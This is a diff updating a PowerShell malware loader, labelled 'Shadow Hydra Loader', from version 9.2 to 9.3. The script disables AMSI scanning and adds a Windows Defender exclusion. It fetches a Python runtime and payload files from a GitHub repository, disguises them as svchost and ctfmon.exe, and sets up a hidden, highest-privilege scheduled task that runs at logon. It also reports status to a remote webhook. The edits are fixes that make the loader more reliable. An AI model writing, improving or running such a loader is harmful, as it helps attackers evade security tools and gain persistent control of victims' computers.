@@ -1,4 +1,4 @@
-# --- THE SHADOW HYDRA LOADER (V9.2 - FIXED ADMIN CHECK) ---
+# --- THE SHADOW HYDRA LOADER (V9.3 - RE-VERIFIED) ---
 # 0. BLIND THE WATCHDOG
 $a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,$null)}}}}
 
@@ -9,14 +9,14 @@ function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($
 $ID = "svchost"
 $Path = "$env:APPDATA\$ID"
 $PY_MASK = "$Path\python\ctfmon.exe"
-$TASK_NAME = "Microsoft\Windows\TextServicesFramework\MsCtfMonitorSystem"
+$TASK_NAME = "MsCtfMonitorSystem"
 
-if (Get-Process -Name "ctfmon" | Where-Object { $_.Path -like "*$Path*" }) { exit }
+if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }) { exit }
 if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
 
-# 1. ATTEMPT DEFENDER EXCLUSION (Fixed Syntax)
-$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+# 1. ATTEMPT DEFENDER EXCLUSION (Verified SID check)
+$currentId = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+if ($currentId.Groups -contains "S-1-5-32-544") {
     Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
 }
 
@@ -26,28 +26,27 @@ if (!(Test-Path $PY_MASK)) {
     $zip = "$Path\py.zip"
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/py_core.zip" -OutFile $zip
     if (!(Test-Path "$Path\python")) { New-Item -ItemType Directory -Path "$Path\python" -Force }
-    $shell = New-Object -ComObject Shell.Application
-    $zipFile = $shell.NameSpace($zip)
-    $dest = $shell.NameSpace("$Path\python")
-    $dest.CopyHere($zipFile.Items(), 0x10) 
+    
+    # Using Expand-Archive for better reliability
+    Expand-Archive -Path $zip -DestinationPath "$Path\python" -Force
     Remove-Item $zip -ErrorAction SilentlyContinue
 }
 
 Send-Ghost "Syncing Shadow Logic..."
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py" -OutFile "$Path\WinServices.py"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin" -OutFile "$Path\mui_cache.zip"
+$binZip = "$Path\mui_cache.zip"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin" -OutFile $binZip
 
-$zipFile = $shell.NameSpace("$Path\mui_cache.zip")
-$dest = $shell.NameSpace($Path)
-$dest.CopyHere($zipFile.Items(), 0x10) 
-Remove-Item "$Path\mui_cache.zip" -ErrorAction SilentlyContinue
+# Unzip payloads
+Expand-Archive -Path $binZip -DestinationPath $Path -Force
+Remove-Item $binZip -ErrorAction SilentlyContinue
 
 # 3. PERSISTENCE VIA SCHEDULED TASK
-$action = New-ScheduledTaskAction -Execute $PY_MASK -Argument "`"$Path\WinServices.py`"" -WorkingDirectory $Path
+$action = New-ScheduledTaskAction -Execute $PY_MASK -Argument "`"$Path\WinServices.py`""
 $trigger = New-ScheduledTaskTrigger -AtLogOn
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-Register-ScheduledTask -TaskName $TASK_NAME -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue
+# Simple registration that doesn't need complex setting objects
+Register-ScheduledTask -TaskName $TASK_NAME -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction SilentlyContinue
 
 # 4. ENGAGE
 Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden
-Send-Ghost "Hydra v9.2 Online. Fixed and active."
+Send-Ghost "Hydra v9.3 Online. Re-verified and active."
